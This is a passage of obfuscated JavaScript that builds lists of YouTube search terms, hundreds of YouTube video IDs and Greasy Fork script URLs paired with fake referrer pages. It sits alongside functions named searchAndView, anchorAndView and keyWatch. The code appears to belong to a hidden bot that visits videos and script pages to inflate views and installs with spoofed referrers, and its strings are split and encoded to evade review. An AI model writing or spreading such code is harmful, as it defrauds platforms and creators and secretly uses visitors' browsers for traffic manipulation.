searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + V(0x1) + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0xf0c + -0x1b23 + 0xf * 0xcf)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xa2e * 0x2 + 0x6 * 0x4d5 + -0x3150)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0xef7 + -0x216f + 0x33 * 0xf3);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    V(0x10) + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    U(0x4, 'OPbT') + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    U(0x9, '#4^9') + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + W(0x12) + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
